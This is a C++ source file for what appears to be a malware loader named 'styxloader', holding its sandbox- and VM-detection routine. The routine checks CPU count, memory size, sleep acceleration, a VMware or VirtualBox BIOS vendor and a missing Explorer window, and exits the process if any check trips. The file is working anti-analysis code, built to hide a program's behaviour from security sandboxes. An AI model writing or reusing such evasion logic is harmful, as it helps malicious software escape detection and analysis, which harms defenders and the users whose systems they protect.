#include "styxloader/sandbox_check.hpp"

#include <windows.h>
#include <iostream>
#include <string>

namespace styxloader {

bool IsRunningInSandbox() {
    // Check 1: Number of CPUs (sandboxes often simulate few cores)
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        return true;
    }

    // Check 2: Total memory (sandboxes limit RAM)
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2LL * 1024 * 1024 * 1024) {  // Less than 2 GB
        return true;
    }

    // Check 3: Execution time / sleep-skipping detection
    // Audit note: the original 'if (> 30000) { /* empty body */ }' branch
    // was dead code. We keep the same logic structure here for parity with
    // the audited version; the dead branch is preserved as a no-op
    // intentionally — a future commit may implement 'long-running' checks
    // (e.g. user interaction sampling) without breaking compatibility.
    static DWORD startTime = GetTickCount();
    if (GetTickCount() - startTime > 30000) {
        // Not sandbox if run this long — no-op (dead branch preserved).
    } else {
        Sleep(1000);  // Sleep to simulate activity
        if (GetTickCount() - startTime < 500) {
            // If time didn't advance ~1s, it's accelerated (sandbox)
            return true;
        }
    }

    // Check 4: Virtual hardware (basic VM detection via BIOS vendor)
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\BIOS",
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char biosVendor[256] = {0};
        DWORD size = sizeof(biosVendor);
        if (RegQueryValueExA(hKey, "BIOSVendor", NULL, NULL,
                             (LPBYTE)biosVendor, &size) == ERROR_SUCCESS) {
            std::string vendor(biosVendor);
            if (vendor.find("VMware") != std::string::npos ||
                vendor.find("VirtualBox") != std::string::npos) {
                RegCloseKey(hKey);
                return true;  // Is VM, but could be intentional lab; adjust as needed
            }
        }
        RegCloseKey(hKey);
    }

    // Check 5: Missing common processes (e.g. explorer.exe on desktop)
    if (!FindWindowA(NULL, "Program Manager")) {  // Explorer window
        return true;
    }

    return false;
}

void CheckAndAbortIfSandbox() {
    if (IsRunningInSandbox()) {
        std::cout << "Sandbox environment detected. Aborting." << std::endl;
        ExitProcess(0);
    }
}

}  // namespace styxloader
